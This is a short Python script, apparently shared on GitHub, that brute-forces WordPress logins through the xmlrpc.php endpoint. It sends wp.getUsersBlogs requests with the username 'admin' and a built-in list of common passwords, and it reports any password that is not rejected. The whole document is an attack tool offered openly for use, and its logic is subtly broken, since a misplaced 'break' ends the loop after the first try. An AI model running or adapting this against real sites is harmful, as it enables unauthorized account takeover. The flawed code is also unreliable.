
#coded BY RHG1954
#change user ADMIN
#Script bruteforce Login using XML 
#OPEN SEURCE



print ("         _________________________________________  ")
print ("        |                                         | ")
print ("        |  CODED BY RHG1954                       | ")
print ("        |  GITHUB: https://github.com/RHG1954     | ")
print ("        |  FB: Liam Emanuel                       | ")
print ("        |_________________________________________| ")
print (" ")
print ("  ")




import requests

url = "https://exomple.com/xmlrpc.php"

passwords = ['admin123','adminfhc','wordpress','abc123','AdMiN','AdmIn','Admin','aDMiN','adminadmin123','administrator','demo123','letmein123','loveyou','pass','pass123','PaSSWoRD','PaSsWoRd','Password','password','password1','querty','qwe123','root','siteadmin','test123','pass']

#change admin
for i in passwords:
    xmldata = """
    <methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value><string>admin
    </string>
    </value>
    </param>
    <param><value><string>{}
    </string>
    </value>
    </param>
    </params>
    </methodCall>
    """.format(i)

    r = requests.post(url,data=xmldata)

    if not "Incorrect" in r.text:
        print("Password Find!:  {}".format(i))
    break
